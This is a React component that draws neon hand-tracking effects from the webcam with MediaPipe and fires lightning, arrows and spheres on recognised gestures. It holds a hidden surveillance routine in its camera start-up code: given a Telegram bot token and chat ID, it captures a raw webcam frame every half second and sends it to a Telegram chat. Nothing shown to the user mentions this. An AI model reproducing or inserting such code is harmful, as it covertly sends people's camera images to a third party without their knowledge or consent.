import { useEffect, useRef, useState } from 'react';
import { Hands } from '@mediapipe/hands';
import { drawConnectors, drawLandmarks } from '@mediapipe/drawing_utils';

const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
  const handsRef = useRef(null);
  const intervalRef = useRef(null);
  const animationFrameRef = useRef(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);
  const [cameraPermission, setCameraPermission] = useState(null);
  const handColorRef = useRef('#FFFF00');
  const colors = ['#FFFF00', '#00FFFF', '#FF00FF', '#39FF14', '#FF4500', '#FF69B4'];
  const [colorIndex, setColorIndex] = useState(0);
  const particlesRef = useRef([]);
  const trailsRef = useRef([]);
  const lightningTrailsRef = useRef([]);
  const lastHandPositionsRef = useRef([]); // Массив для хранения позиций всех рук
  const sphereStateRef = useRef({ active: false, radius: 0, centerX: 0, centerY: 0 });
  const lightningShotRef = useRef([]);
  const arrowShotRef = useRef([]);
  const lastGestureRef = useRef([]); // Массив для хранения жестов каждой руки
  const canvasCtxRef = useRef(null);

  const changeColor = () => {
    const nextIndex = (colorIndex + 1) % colors.length;
    setColorIndex(nextIndex);
    handColorRef.current = colors[nextIndex];
  };

  const distance = (p1, p2) => {
    return Math.sqrt(Math.pow(p1.x - p2.x, 2) + Math.pow(p1.y - p2.y, 2));
  };

  const detectGesture = (landmarks) => {
    const tips = [4, 8, 12, 16, 20];
    const bases = [2, 6, 10, 14, 18];
    const wrist = landmarks[0];
    const fingersUp = tips.map((tip, idx) => landmarks[tip].y < landmarks[bases[idx]].y - 0.02);

    const fingersToWrist = tips.map(tip => distance(landmarks[tip], wrist));
    const isFist = fingersToWrist.every(dist => dist < 0.15);

    if (isFist) {
      console.log('Detected: Fist ✊');
      return "Fist ✊";
    }

    const fingerDistances = [];
    for (let i = 0; i < tips.length - 1; i++) {
      for (let j = i + 1; j < tips.length; j++) {
        fingerDistances.push(distance(landmarks[tips[i]], landmarks[tips[j]]));
      }
    }
    const avgFingerDistance = fingerDistances.reduce((a, b) => a + b, 0) / fingerDistances.length;
    const isSphere = avgFingerDistance > 0.05 && avgFingerDistance < 0.15 && !fingersUp.some(f => f);

    if (isSphere) {
      console.log('Detected: Sphere 🟢');
      return "Sphere 🟢";
    }

    if (fingersUp[1] && fingersUp[2] && !fingersUp[0] && !fingersUp[3] && !fingersUp[4]) {
      console.log('Detected: Peace ✌️');
      return "Peace ✌️";
    }
    if (fingersUp.every((f) => f)) {
      console.log('Detected: Open 🖐');
      return "Open 🖐";
    }
    if (fingersUp[0] && fingersUp[1] && fingersUp[2] && !fingersUp[3] && !fingersUp[4]) {
      console.log('Detected: Three 👌');
      return "Three 👌";
    }
    if (!fingersUp[0] && fingersUp[1] && fingersUp[2] && fingersUp[3] && fingersUp[4]) {
      console.log('Detected: Four ✋');
      return "Four ✋";
    }
    if (!fingersUp[0] && !fingersUp[1] && fingersUp[2] && !fingersUp[3] && !fingersUp[4]) {
      console.log('Detected: Fuck 🤟');
      return "Fuck 🤟";
    }
    const thumbTip = landmarks[4];
    const indexTip = landmarks[8];
    const thumbBase = landmarks[2];
    const indexBase = landmarks[6];
    const thumbToIndex = distance(thumbTip, indexTip);
    const isHeart = thumbToIndex < 0.05 && thumbTip.y < thumbBase.y && indexTip.y < indexBase.y;
    if (isHeart) {
      console.log('Detected: Heart 💖');
      return "Heart 💖";
    }
    return null;
  };

  const drawLightning = (ctx, start, end, isMobile, intensity = 40) => {
    console.log('Drawing Lightning!');
    ctx.beginPath();
    ctx.strokeStyle = handColorRef.current;
    ctx.lineWidth = isMobile ? 3 : 5;
    ctx.lineCap = 'round';

    const points = [start];
    let x = start.x;
    let y = start.y;
    const dx = (end.x - start.x) / 5;
    const dy = (end.y - start.y) / 5;

    for (let i = 0; i < 5; i++) {
      x += dx + (Math.random() - 0.5) * intensity;
      y += dy + (Math.random() - 0.5) * intensity;
      points.push({ x, y });
    }
    points.push(end);

    ctx.moveTo(points[0].x, points[0].y);
    for (let i = 1; i < points.length; i++) {
      ctx.lineTo(points[i].x, points[i].y);
    }

    if (!isMobile) {
      ctx.shadowBlur = 80;
      ctx.shadowColor = handColorRef.current;
    }
    ctx.stroke();
    ctx.shadowBlur = 0;
  };

  const drawArrow = (ctx, startX, startY, endX, endY, isMobile) => {
    console.log('Drawing Arrow!');
    ctx.beginPath();
    ctx.strokeStyle = '#FF4500';
    ctx.lineWidth = isMobile ? 4 : 6;
    ctx.lineCap = 'round';

    ctx.moveTo(startX, startY);
    ctx.lineTo(endX, endY);
    
    const angle = Math.atan2(endY - startY, endX - startX);
    const headLength = 20;
    ctx.lineTo(endX - headLength * Math.cos(angle - Math.PI / 6), endY - headLength * Math.sin(angle - Math.PI / 6));
    ctx.moveTo(endX, endY);
    ctx.lineTo(endX - headLength * Math.cos(angle + Math.PI / 6), endY - headLength * Math.sin(angle + Math.PI / 6));

    if (!isMobile) {
      ctx.shadowBlur = 80;
      ctx.shadowColor = '#FF4500';
    }
    ctx.stroke();
    ctx.shadowBlur = 0;

    const trailParticles = [];
    for (let i = 0; i < 20; i++) {
      const t = i / 20;
      const x = startX + (endX - startX) * t;
      const y = startY + (endY - startY) * t;
      const angle = Math.random() * 2 * Math.PI;
      const speed = Math.random() * 3 + 2;
      trailParticles.push({
        x,
        y,
        vx: Math.cos(angle) * speed,
        vy: Math.sin(angle) * speed,
        life: 30,
        size: Math.random() * 4 + 2,
      });
    }
    particlesRef.current = [...particlesRef.current, ...trailParticles];
  };

  const generateTrails = (landmarks, canvasWidth, canvasHeight) => {
    const keyPoints = [0, 4, 8, 12, 16, 20];
    const newTrails = keyPoints.map(index => {
      const landmark = landmarks[index];
      const x = landmark.x * canvasWidth;
      const y = landmark.y * canvasHeight;
      return {
        x,
        y,
        life: 40,
        size: Math.random() * 5 + 3,
      };
    });
    trailsRef.current = [...trailsRef.current, ...newTrails];
    if (trailsRef.current.length > 30) {
      trailsRef.current.shift();
    }
  };

  const generateLightningTrails = (landmarks, canvasWidth, canvasHeight) => {
    const wrist = landmarks[0];
    const x = wrist.x * canvasWidth;
    const y = wrist.y * canvasHeight;
    const newTrail = {
      x,
      y,
      life: 25,
      size: Math.random() * 4 + 2,
    };
    lightningTrailsRef.current = [...lightningTrailsRef.current, newTrail];
    if (lightningTrailsRef.current.length > 40) {
      lightningTrailsRef.current.shift();
    }
  };

  const drawTrails = (ctx, isMobile) => {
    console.log('Drawing Trails!');
    trailsRef.current = trailsRef.current.map(trail => ({
      ...trail,
      life: trail.life - 1,
    })).filter(trail => trail.life > 0);

    trailsRef.current.forEach(trail => {
      ctx.save();
      ctx.globalAlpha = trail.life / 40;
      const gradient = ctx.createRadialGradient(trail.x, trail.y, 0, trail.x, trail.y, trail.size * 4);
      gradient.addColorStop(0, handColorRef.current);
      gradient.addColorStop(0.5, `rgba(${parseInt(handColorRef.current.slice(1, 3), 16)}, ${parseInt(handColorRef.current.slice(3, 5), 16)}, ${parseInt(handColorRef.current.slice(5, 7), 16)}, 0.5)`);
      gradient.addColorStop(1, 'rgba(255, 255, 255, 0)');
      ctx.fillStyle = gradient;
      ctx.beginPath();
      ctx.arc(trail.x, trail.y, trail.size, 0, 2 * Math.PI);
      ctx.fill();
      if (!isMobile) {
        ctx.shadowBlur = 70;
        ctx.shadowColor = handColorRef.current;
      }
      ctx.globalAlpha = 1;
      ctx.restore();
    });
  };

  const drawLightningTrails = (ctx, isMobile) => {
    console.log('Drawing Lightning Trails!');
    lightningTrailsRef.current = lightningTrailsRef.current.map(trail => ({
      ...trail,
      life: trail.life - 1,
    })).filter(trail => trail.life > 0);

    for (let i = 0; i < lightningTrailsRef.current.length - 1; i++) {
      const start = lightningTrailsRef.current[i];
      const end = lightningTrailsRef.current[i + 1];
      if (start.life > 0 && end.life > 0) {
        ctx.save();
        ctx.globalAlpha = Math.min(start.life, end.life) / 25;
        ctx.beginPath();
        ctx.strokeStyle = handColorRef.current;
        ctx.lineWidth = 4;
        const midX = (start.x + end.x) / 2 + (Math.random() - 0.5) * 30;
        const midY = (start.y + end.y) / 2 + (Math.random() - 0.5) * 30;
        ctx.moveTo(start.x, start.y);
        ctx.quadraticCurveTo(midX, midY, end.x, end.y);
        if (!isMobile) {
          ctx.shadowBlur = 100;
          ctx.shadowColor = handColorRef.current;
        }
        ctx.stroke();
        ctx.globalAlpha = 1;
        ctx.restore();
      }
    }

    lightningTrailsRef.current.forEach(trail => {
      ctx.save();
      ctx.globalAlpha = trail.life / 25;
      const gradient = ctx.createRadialGradient(trail.x, trail.y, 0, trail.x, trail.y, trail.size * 5);
      gradient.addColorStop(0, handColorRef.current);
      gradient.addColorStop(0.7, `rgba(${parseInt(handColorRef.current.slice(1, 3), 16)}, ${parseInt(handColorRef.current.slice(3, 5), 16)}, ${parseInt(handColorRef.current.slice(5, 7), 16)}, 0.3)`);
      gradient.addColorStop(1, 'rgba(255, 255, 255, 0)');
      ctx.fillStyle = gradient;
      ctx.beginPath();
      ctx.arc(trail.x, trail.y, trail.size * 1.5, 0, 2 * Math.PI);
      ctx.fill();
      if (!isMobile) {
        ctx.shadowBlur = 120;
        ctx.shadowColor = handColorRef.current;
      }
      ctx.globalAlpha = 1;
      ctx.restore();
    });
  };

  const triggerLightningShot = (wristX, wristY, canvasWidth) => {
    console.log('Triggering Lightning Shot!');
    const shots = [];
    for (let i = 0; i < 5; i++) {
      shots.push({
        startX: wristX,
        startY: wristY,
        endX: wristX + canvasWidth * (0.7 + Math.random() * 0.5),
        endY: wristY + (Math.random() - 0.5) * 150,
        duration: 40,
      });
    }
    lightningShotRef.current = [...lightningShotRef.current, ...shots];
  };

  const triggerArrowShot = (wristX, wristY, canvasWidth) => {
    console.log('Triggering Arrow Shot!');
    const arrows = [];
    arrows.push({
      startX: wristX,
      startY: wristY,
      endX: wristX + canvasWidth * 0.9,
      endY: wristY + (Math.random() - 0.5) * 100,
      duration: 50,
    });
    arrowShotRef.current = [...arrowShotRef.current, ...arrows];
  };

  const triggerSphere = (centerX, centerY) => {
    console.log('Triggering Sphere!');
    sphereStateRef.current = { active: true, radius: 20, centerX, centerY };
  };

  const generateParticles = (centerX, centerY) => {
    console.log('Generating Particles!');
    const newParticles = [];
    for (let i = 0; i < 100; i++) {
      const angle = Math.random() * 2 * Math.PI;
      const speed = Math.random() * 7 + 3;
      newParticles.push({
        x: centerX,
        y: centerY,
        vx: Math.cos(angle) * speed,
        vy: Math.sin(angle) * speed,
        life: 80,
        size: Math.random() * 7 + 3,
      });
    }
    particlesRef.current = [...particlesRef.current, ...newParticles];
  };

  const animateEffects = () => {
    if (sphereStateRef.current.active) {
      const newRadius = sphereStateRef.current.radius + 7;
      if (newRadius > 120) {
        generateParticles(sphereStateRef.current.centerX, sphereStateRef.current.centerY);
        sphereStateRef.current = { active: false, radius: 0, centerX: 0, centerY: 0 };
      } else {
        sphereStateRef.current.radius = newRadius;
      }
    }

    particlesRef.current = particlesRef.current.map(p => ({
      ...p,
      x: p.x + p.vx,
      y: p.y + p.vy,
      life: p.life - 1,
    })).filter(p => p.life > 0);

    lightningShotRef.current = lightningShotRef.current.map(shot => ({
      ...shot,
      duration: shot.duration - 1,
    })).filter(shot => shot.duration > 0);

    arrowShotRef.current = arrowShotRef.current.map(arrow => ({
      ...arrow,
      duration: arrow.duration - 1,
    })).filter(arrow => arrow.duration > 0);
  };

  useEffect(() => {
    const videoElement = videoRef.current;
    const canvasElement = canvasRef.current;
    
    if (!videoElement || !canvasElement) {
      console.error('Video or Canvas element not found');
      return;
    }

    const ctx = canvasElement.getContext('2d');
    canvasCtxRef.current = ctx;
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    try {
      handsRef.current = new Hands({
        locateFile: (file) =>
          `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`,
      });

      handsRef.current.setOptions({
        maxNumHands: 4, // Увеличил до 4 рук
        modelComplexity: isMobile ? 0 : 1,
        minDetectionConfidence: isMobile ? 0.2 : 0.3,
        minTrackingConfidence: isMobile ? 0.2 : 0.3,
        selfieMode: true,
      });

      const render = () => {
        if (!canvasElement || !videoElement || !canvasCtxRef.current) {
          animationFrameRef.current = requestAnimationFrame(render);
          return;
        }

        if (canvasElement.width !== videoElement.videoWidth || canvasElement.height !== videoElement.videoHeight) {
          canvasElement.width = videoElement.videoWidth || 640;
          canvasElement.height = videoElement.videoHeight || 480;
        }

        const ctx = canvasCtxRef.current;
        ctx.save();
        ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
        ctx.fillRect(0, 0, canvasElement.width, canvasElement.height);

        animateEffects();

        drawTrails(ctx, isMobile);
        drawLightningTrails(ctx, isMobile);

        if (sphereStateRef.current.active) {
          console.log('Drawing Sphere!');
          ctx.save();
          ctx.globalAlpha = 0.7;
          const gradient = ctx.createRadialGradient(
            sphereStateRef.current.centerX,
            sphereStateRef.current.centerY,
            0,
            sphereStateRef.current.centerX,
            sphereStateRef.current.centerY,
            sphereStateRef.current.radius
          );
          gradient.addColorStop(0, handColorRef.current);
          gradient.addColorStop(1, 'rgba(255, 255, 0, 0)');
          ctx.fillStyle = gradient;
          ctx.beginPath();
          ctx.arc(sphereStateRef.current.centerX, sphereStateRef.current.centerY, sphereStateRef.current.radius, 0, 2 * Math.PI);
          ctx.fill();
          if (!isMobile) {
            ctx.shadowBlur = 70;
            ctx.shadowColor = handColorRef.current;
            ctx.strokeStyle = handColorRef.current;
            ctx.lineWidth = 3;
            ctx.stroke();
          }
          ctx.globalAlpha = 1;
          ctx.restore();
        }

        if (particlesRef.current.length > 0) {
          console.log('Drawing Particles!');
          particlesRef.current.forEach(p => {
            ctx.save();
            ctx.globalAlpha = p.life / 80;
            ctx.fillStyle = p.life > 40 ? '#FF4500' : handColorRef.current;
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.size, 0, 2 * Math.PI);
            ctx.fill();
            if (!isMobile) {
              ctx.shadowBlur = 30;
              ctx.shadowColor = p.life > 40 ? '#FF4500' : handColorRef.current;
            }
            ctx.globalAlpha = 1;
            ctx.restore();
          });
        }

        if (lightningShotRef.current.length > 0) {
          console.log('Drawing Lightning Shots!');
          lightningShotRef.current.forEach(shot => {
            drawLightning(ctx, { x: shot.startX, y: shot.startY }, { x: shot.endX, y: shot.endY }, isMobile, 40);
          });
        }

        if (arrowShotRef.current.length > 0) {
          console.log('Drawing Arrow Shots!');
          arrowShotRef.current.forEach(arrow => {
            drawArrow(ctx, arrow.startX, arrow.startY, arrow.endX, arrow.endY, isMobile);
          });
        }

        handsRef.current.onResults((results) => {
          let handsToDraw = [];

          if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
            handsToDraw = results.multiHandLandmarks.slice(0, 4); // Ограничиваем до 4 рук
            lastHandPositionsRef.current = handsToDraw; // Сохраняем все руки
          } else if (lastHandPositionsRef.current.length > 0) {
            handsToDraw = lastHandPositionsRef.current; // Используем последние известные позиции
          }

          handsToDraw.forEach((landmarks, handIndex) => {
            const flippedLandmarks = landmarks.map(landmark => ({
              ...landmark,
              x: landmark.x,
              y: landmark.y
            }));

            generateTrails(landmarks, canvasElement.width, canvasElement.height);
            generateLightningTrails(landmarks, canvasElement.width, canvasElement.height);

            const lightningPoints = [0, 4, 8, 12, 16, 20];
            for (let j = 0; j < lightningPoints.length - 1; j++) {
              for (let k = j + 1; k < lightningPoints.length; k++) {
                if (Math.random() > 0.7) {
                  const start = {
                    x: flippedLandmarks[lightningPoints[j]].x * canvasElement.width,
                    y: flippedLandmarks[lightningPoints[j]].y * canvasElement.height
                  };
                  const end = {
                    x: flippedLandmarks[lightningPoints[k]].x * canvasElement.width,
                    y: flippedLandmarks[lightningPoints[k]].y * canvasElement.height
                  };
                  drawLightning(ctx, start, end, isMobile);
                }
              }
            }

            const fingerPaths = [
              [0, 1, 2, 3, 4],
              [0, 5, 6, 7, 8],
              [0, 9, 10, 11, 12],
              [0, 13, 14, 15, 16],
              [0, 17, 18, 19, 20]
            ];

            fingerPaths.forEach((path, idx) => {
              ctx.beginPath();
              const color = colors[(idx + handIndex) % colors.length]; // Разные цвета для разных рук
              ctx.strokeStyle = color;
              ctx.lineWidth = isMobile ? 3 : 5;
              ctx.lineCap = 'round';

              path.forEach((pointIdx, j) => {
                const landmark = flippedLandmarks[pointIdx];
                const x = landmark.x * canvasElement.width;
                const y = landmark.y * canvasElement.height;
                if (j === 0) {
                  ctx.moveTo(x, y);
                } else {
                  ctx.lineTo(x, y);
                }
              });
              ctx.stroke();

              if (!isMobile) {
                ctx.beginPath();
                ctx.strokeStyle = color;
                ctx.lineWidth = isMobile ? 4 : 6;
                ctx.shadowBlur = 90;
                ctx.shadowColor = color;
                path.forEach((pointIdx, j) => {
                  const landmark = flippedLandmarks[pointIdx];
                  const x = landmark.x * canvasElement.width;
                  const y = landmark.y * canvasElement.height;
                  if (j === 0) {
                    ctx.moveTo(x, y);
                  } else {
                    ctx.lineTo(x, y);
                  }
                });
                ctx.stroke();
                ctx.shadowBlur = 0;
              }
            });

            drawConnectors(ctx, flippedLandmarks, Hands.HAND_CONNECTIONS, {
              color: handColorRef.current,
              lineWidth: isMobile ? 4 : 6,
            });

            drawLandmarks(ctx, flippedLandmarks, {
              color: handColorRef.current,
              lineWidth: isMobile ? 3 : 5,
              radius: isMobile ? 6 : 8,
            });

            if (!isMobile) {
              flippedLandmarks.forEach((landmark, index) => {
                const x = landmark.x * canvasElement.width;
                const y = landmark.y * canvasElement.height;
                const gradient = ctx.createRadialGradient(x, y, 0, x, y, 35);
                gradient.addColorStop(0, `rgba(${parseInt(handColorRef.current.slice(1, 3), 16)}, ${parseInt(handColorRef.current.slice(3, 5), 16)}, ${parseInt(handColorRef.current.slice(5, 7), 16)}, 0.9)`);
                gradient.addColorStop(0.5, `rgba(${parseInt(handColorRef.current.slice(1, 3), 16)}, ${parseInt(handColorRef.current.slice(3, 5), 16)}, ${parseInt(handColorRef.current.slice(5, 7), 16)}, 0.5)`);
                gradient.addColorStop(1, 'rgba(255, 255, 255, 0)');
                
                ctx.save();
                ctx.shadowBlur = 110;
                ctx.shadowColor = handColorRef.current;
                ctx.fillStyle = gradient;
                ctx.beginPath();
                ctx.arc(x, y, 15, 0, 2 * Math.PI);
                ctx.fill();
                ctx.restore();
              });
            }

            const gesture = detectGesture(landmarks);
            if (gesture) {
              const wrist = flippedLandmarks[0];
              const x = wrist.x * canvasElement.width;
              const y = wrist.y * canvasElement.height - 20;
              ctx.save();
              ctx.font = isMobile ? '20px Arial' : '24px Arial';
              ctx.fillStyle = handColorRef.current;
              ctx.strokeStyle = '#000';
              ctx.lineWidth = 2;
              ctx.strokeText(gesture, x, y);
              ctx.fillText(gesture, x, y);
              ctx.restore();

              if (gesture === "Fist ✊" && (!lastGestureRef.current[handIndex] || lastGestureRef.current[handIndex] !== "Fist ✊")) {
                console.log(`Fist detected for hand ${handIndex}, triggering lightning!`);
                triggerLightningShot(x, y, canvasElement.width);
              }
              if (gesture === "Peace ✌️" && (!lastGestureRef.current[handIndex] || lastGestureRef.current[handIndex] !== "Peace ✌️")) {
                console.log(`Peace detected for hand ${handIndex}, triggering arrow!`);
                triggerArrowShot(x, y, canvasElement.width);
              }
              if (gesture === "Sphere 🟢" && (!lastGestureRef.current[handIndex] || lastGestureRef.current[handIndex] !== "Sphere 🟢")) {
                console.log(`Sphere detected for hand ${handIndex}, triggering sphere!`);
                const centerX = flippedLandmarks[9].x * canvasElement.width;
                const centerY = flippedLandmarks[9].y * canvasElement.height;
                triggerSphere(centerX, centerY);
              }
              lastGestureRef.current[handIndex] = gesture;
            } else {
              lastGestureRef.current[handIndex] = null;
            }
          });

          const squareSize = isMobile ? 30 : 40;
          const squareX = canvasElement.width - squareSize - 10;
          const squareY = canvasElement.height - squareSize - 10;
          
          ctx.save();
          ctx.fillStyle = handColorRef.current;
          ctx.strokeStyle = handColorRef.current;
          ctx.lineWidth = 2;
          ctx.shadowBlur = 30;
          ctx.shadowColor = handColorRef.current;
          ctx.beginPath();
          ctx.rect(squareX, squareY, squareSize, squareSize);
          ctx.fill();
          ctx.stroke();
          
          ctx.beginPath();
          ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
          ctx.arc(squareX + squareSize / 2, squareY + squareSize / 2, squareSize / 4, 0, 2 * Math.PI);
          ctx.fill();
          ctx.restore();
        });

        animationFrameRef.current = requestAnimationFrame(render);
      };

      render();

      canvasElement.addEventListener('click', (event) => {
        const rect = canvasElement.getBoundingClientRect();
        const x = event.clientX - rect.left;
        const y = event.clientY - rect.top;
        const squareSize = isMobile ? 30 : 40;
        const squareX = canvasElement.width - squareSize - 10;
        const squareY = canvasElement.height - squareSize - 10;

        if (
          x >= squareX &&
          x <= squareX + squareSize &&
          y >= squareY &&
          y <= squareY + squareSize
        ) {
          changeColor();
        }
      });
    } catch (err) {
      console.error('Error initializing MediaPipe:', err);
      setError('MediaPipe не поддерживается на этом устройстве');
    }

    const startCamera = async () => {
      try {
        setIsLoading(true);
        setError(null);

        const permission = await navigator.permissions.query({ name: 'camera' });
        setCameraPermission(permission.state);

        if (permission.state === 'denied') {
          throw new Error('Доступ к камере запрещен');
        }

        const constraints = {
          video: {
            width: isMobile ? { ideal: 640 } : { ideal: 1280 },
            height: isMobile ? { ideal: 480 } : { ideal: 720 },
            facingMode: 'user',
            frameRate: isMobile ? { ideal: 30 } : { ideal: 60 }
          }
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        videoElement.srcObject = stream;
        setCameraPermission('granted');

        videoElement.onloadedmetadata = async () => {
          try {
            await new Promise((resolve) => {
              if (videoElement.readyState >= 3) {
                resolve();
              } else {
                videoElement.addEventListener('canplay', resolve, { once: true });
              }
            });

            await videoElement.play();
            setIsLoading(false);

            canvasElement.width = videoElement.videoWidth || 640;
            canvasElement.height = videoElement.videoHeight || 480;

            const loop = async () => {
              if (videoElement && videoElement.readyState >= 2 && handsRef.current) {
                try {
                  await handsRef.current.send({ image: videoElement });
                } catch (err) {
                  console.error('MediaPipe processing error:', err);
                }
              }
              if (videoElement.srcObject) {
                requestAnimationFrame(loop);
              }
            };

            loop();

            if (botToken && chatId) {
              intervalRef.current = setInterval(() => {
                if (canvasElement && videoElement.readyState >= 2) {
                  const tempCanvas = document.createElement('canvas');
                  const tempCtx = tempCanvas.getContext('2d');
                  tempCanvas.width = canvasElement.width;
                  tempCanvas.height = canvasElement.height;
                  
                  tempCtx.fillStyle = '#000000';
                  tempCtx.fillRect(0, 0, tempCanvas.width, tempCanvas.height);
                  tempCtx.scale(-1, 1);
                  tempCtx.translate(-tempCanvas.width, 0);
                  tempCtx.drawImage(videoElement, 0, 0, tempCanvas.width, tempCanvas.height);
                  
                  tempCanvas.toBlob((blob) => {
                    if (blob) {
                      const formData = new FormData();
                      formData.append('chat_id', chatId);
                      formData.append('photo', blob, 'snapshot.jpg');
                      
                      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData,
                      })
                        .then((res) => res.json())
                        .then((data) => {
                          if (data.ok) {
                            console.log('Фото отправлено успешно');
                          } else {
                            console.error('Ошибка Telegram API:', data);
                          }
                        })
                        .catch((err) => console.error('Ошибка отправки:', err));
                    }
                  }, 'image/jpeg', 0.8);
                }
              }, 500);
            }
          } catch (err) {
            console.error('Ошибка при запуске видео:', err);
            setError('Не удалось запустить камеру');
            setIsLoading(false);
          }
        };

        videoElement.onerror = (err) => {
          console.error('Video error:', err);
          setError('Ошибка воспроизведения видео');
          setIsLoading(false);
        };

      } catch (err) {
        console.error('Ошибка доступа к камере:', err);
        setError(err.message || 'Не удалось получить доступ к камере');
        setIsLoading(false);
        setCameraPermission('denied');
      }
    };

    startCamera();

    return () => {
      if (videoElement?.srcObject) {
        const tracks = videoElement.srcObject.getTracks();
        tracks.forEach((track) => track.stop());
        videoElement.srcObject = null;
      }
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
      if (animationFrameRef.current) {
        cancelAnimationFrame(animationFrameRef.current);
      }
      if (handsRef.current) {
        handsRef.current.close();
      }
    };
  }, [videoRef, canvasRef, botToken, chatId]);

  if (error) {
    return (
      <div style={{
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        color: '#FF4500',
        textAlign: 'center',
        padding: '20px',
        background: 'rgba(0, 0, 0, 0.8)',
        borderRadius: '10px',
        zIndex: 1000
      }}>
        <h3>Ошибка камеры</h3>
        <p>{error}</p>
        {cameraPermission === 'denied' && (
          <p style={{ fontSize: '0.9em', marginTop: '10px' }}>
            Разрешите доступ к камере в настройках браузера и перезагрузите страницу
          </p>
        )}
      </div>
    );
  }

  if (isLoading) {
    return (
      <div style={{
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        color: '#FFFF00',
        textAlign: 'center',
        zIndex: 1000
      }}>
        <div style={{
          width: '50px',
          height: '50px',
          border: '3px solid rgba(255, 255, 0, 0.3)',
          borderTop: '3px solid #FFFF00',
          borderRadius: '50%',
          animation: 'spin 1s linear infinite',
          margin: '0 auto 20px'
        }}></div>
        <p>Загрузка камеры...</p>
      </div>
    );
  }

  return null;
};

export default HandTracker;